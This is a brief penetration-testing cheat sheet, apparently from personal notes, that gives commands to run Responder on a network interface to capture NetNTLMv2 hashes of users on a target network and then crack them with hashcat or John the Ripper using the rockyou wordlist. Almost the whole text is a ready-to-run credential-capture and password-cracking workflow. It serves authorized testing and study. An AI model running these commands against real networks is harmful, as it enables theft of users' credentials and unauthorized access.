
### Open Responder 

```ruby
sudo responder -I [Interface Name]
```


### Wait to get NTLM hashes of users on Target


### Once got the hash , you can crack it using hashcat or john

##### Hashcat
```ruby
hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt
```

##### John
```ruby
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2
```


